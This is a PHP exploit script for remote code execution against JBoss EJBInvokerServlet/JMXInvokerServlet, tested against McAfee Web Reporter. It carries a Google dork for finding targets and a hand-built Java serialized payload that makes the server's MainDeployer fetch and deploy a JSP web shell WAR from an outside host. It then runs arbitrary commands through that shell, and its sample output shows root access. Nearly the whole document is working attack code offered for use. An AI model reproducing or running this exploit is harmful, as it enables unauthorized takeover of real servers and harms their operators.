<?php
/*
Apache Tomcat/JBoss EJBInvokerServlet / JMXInvokerServlet (RMI over HTTP) Marshalled Object 
Remote Code Execution

google dork: inurl:status EJBInvokerServlet 

this was used successfully on Windows during a penetration test against
McAfee Web Reporter 5.2.1 (tcp port 9111/http) gaining administrative privileges
see: http://www.mcafee.com/it/downloads/downloads.aspx
file tested: webreporter64bit.zip

Usage:
C:\PHP>php 9sg_ejb.php 192.168.0.1 id

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
X-Powered-By: Servlet 2.4; JBoss-4.0.5.GA (build: CVSTag=Branch_4_0 date=2006101
62339)/Tomcat-5.5
Set-Cookie: JSESSIONID=E9EEE1D6AD27D64ED3835C1092C4FC29; Path=/
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 43
Date: Fri, 04 Oct 2013 07:25:48 GMT
Connection: close


uid=0(root) gid=0(root) groups=0(root)

C:\PHP>

~ rgod ~
*/

$host=$argv[1];
$cmd=$argv[2];
//$port=9111; //mcafee
$port=80;

//small jsp shell
//change this if you want, url to the app to be deployed, keep it short
$url="http://retrogod.altervista.org/a.war?"; 


$url_len=pack("n",strlen($url));

function hex_dump($data, $newline="\n") { 
static $from = '';   
static $to = '';    
static $width = 16; static $pad = '.';  
 if ($from==='')   {     
     for ($i=0; $i<=0xFF; $i++)  { 
         $from .= chr($i);       
         $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;   
     }   
 }    
$hex = str_split(bin2hex($data), $width*2);   
$chars = str_split(strtr($data, $from, $to), $width);    
$offset = 0;   
foreach ($hex as $i => $line)   {     
    echo sprintf('%6X',$offset).' : '.implode(' ', str_split($line,2)) . ' [' . $chars[$i] . ']' . $newline;    
   $offset += $width;   
  } 
} 

$frag_i=
"\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73". // ....sr.) org.jbos
"\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72". // s.invoca tion.Mar
"\x73\x68\x61\x6c\x6c\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f". // shalledI nvocatio
"\x6e\xf6\x06\x95\x27\x41\x3e\xa4\xbe\x0c\x00\x00\x78\x70\x70\x77". // n...'A>. ....xppw
"\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72\x00\x11\x6a\x61\x76". // .x..G..S .sr..jav
"\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2". // a.lang.I nteger..
"\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75". // .....8.. .I..valu
"\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e". // exr..jav a.lang.N
"\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00". // umber... ........
"\x78\x70\x26\x95\xbe\x0a\x73\x72\x00\x24\x6f\x72\x67\x2e\x6a\x62". // xp&...sr .$org.jb
"\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d". // oss.invo cation.M
"\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x56\x61\x6c\x75\x65\xea\xcc". // arshalle dValue..
"\xe0\xd1\xf4\x4a\xd0\x99\x0c\x00\x00\x78\x70\x77";

$frag_ii="\x00";

$frag_iii=
"\xac\xed\x00\x05\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e".     // .....ur. .[Ljava.
"\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f". // lang.Obj ect;..X.
"\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x04\x73\x72\x00". // .s)l...x p....sr.
"\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e". // .javax.m anagemen
"\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b". // t.Object Name....
"\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x21\x6a\x62\x6f\x73". // .m.....x pt.!jbos
"\x73\x2e\x73\x79\x73\x74\x65\x6d\x3a\x73\x65\x72\x76\x69\x63\x65". // s.system :service
"\x3d\x4d\x61\x69\x6e\x44\x65\x70\x6c\x6f\x79\x65\x72\x78\x74\x00". // =MainDep loyerxt.
"\x06\x64\x65\x70\x6c\x6f\x79\x75\x71\x00\x7e\x00\x00\x00\x00\x00". // .deployu q.~.....
"\x01\x74".
$url_len.
$url.
"\x75\x72\x00".
"\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61".                         // ur..[ Ljava.la
"\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d". // ng.Strin g;..V...
"\x7b\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61". // {G...xp. ...t..ja
"\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67";

$frag_iv=
"\x0d\xd3". 
"\xbe\xc9\x78\x77\x04\x00\x00\x00\x01\x73\x72\x00\x22\x6f\x72\x67". // ..xw.... .sr."org
"\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f". // .jboss.i nvocatio
"\x6e\x2e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x4b\x65\x79\xb8". // n.Invoca tionKey.
"\xfb\x72\x84\xd7\x93\x85\xf9\x02\x00\x01\x49\x00\x07\x6f\x72\x64". // .r...... ..I..ord
"\x69\x6e\x61\x6c\x78\x70\x00\x00\x00\x05\x73\x71\x00\x7e\x00\x05". // inalxp.. ..sq.~..
"\x77\x0d\x00\x00\x00\x05\xac\xed\x00\x05\x70\xfb\x57\xa7\xaa\x78". // w....... ..p.W..x
"\x77\x04\x00\x00\x00\x03\x73\x71\x00\x7e\x00\x07\x00\x00\x00\x04". // w.....sq .~......
"\x73\x72\x00\x23\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e". // sr.#org. jboss.in
"\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x49\x6e\x76\x6f\x63\x61\x74". // vocation .Invocat
"\x69\x6f\x6e\x54\x79\x70\x65\x59\xa7\x3a\x1c\xa5\x2b\x7c\xbf\x02". // ionTypeY .:..+|..
"\x00\x01\x49\x00\x07\x6f\x72\x64\x69\x6e\x61\x6c\x78\x70\x00\x00". // ..I..ord inalxp..
"\x00\x01\x73\x71\x00\x7e\x00\x07\x00\x00\x00\x0a\x70\x74\x00\x0f". // ..sq.~.. ....pt..
"\x4a\x4d\x58\x5f\x4f\x42\x4a\x45\x43\x54\x5f\x4e\x41\x4d\x45\x73". // JMX_OBJE CT_NAMEs
"\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d". // r..javax .managem
"\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03". // ent.Obje ctName..
"\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x21\x6a\x62". // ...m.... .xpt.!jb
"\x6f\x73\x73\x2e\x73\x79\x73\x74\x65\x6d\x3a\x73\x65\x72\x76\x69". // oss.syst em:servi
"\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65\x70\x6c\x6f\x79\x65\x72\x78". // ce=MainD eployerx
"\x78";                                                             // x

$data=$frag_i.pack("v",strlen($frag_iii)+8).$frag_ii.pack("n",strlen($frag_iii)).$frag_iii.$frag_iv;

//$pk=""POST /invoker/JMXInvokerServlet/ HTTP/1.1\r\n". //the same ...

$pk="POST /invoker/EJBInvokerServlet/ HTTP/1.1\r\n".
    "ContentType: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation\r\n".
    "Accept-Encoding: x-gzip,x-deflate,gzip,deflate\r\n".
    "User-Agent: Java/1.6.0_21\r\n".
    "Host: ".$host.":".$port."\r\n".
    "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n".
    "Connection: keep-alive\r\n".
    "Content-type: application/x-www-form-urlencoded\r\n".
    "Content-Length: ".strlen($data)."\r\n\r\n".
    $data;
echo hex_dump($pk)."\n";
$fp=fsockopen($host,$port,$e,$err,3);
fputs($fp,$pk);
$out=fread($fp,8192);
fclose($fp);
echo hex_dump($out)."\n";

sleep(5);

$pk="GET /a/pwn.jsp?cmd=".urlencode($cmd)." HTTP/1.0\r\n".
    "Host: ".$host.":".$port."\r\n".
    "Connection: Close\r\n\r\n";

echo hex_dump($pk)."\n";
$fp=fsockopen($host,$port,$e,$err,3);
fputs($fp,$pk);
$out="";
while (!feof($fp)) {
$out.=fread($fp,8192);
}
fclose($fp);
echo $out;
?>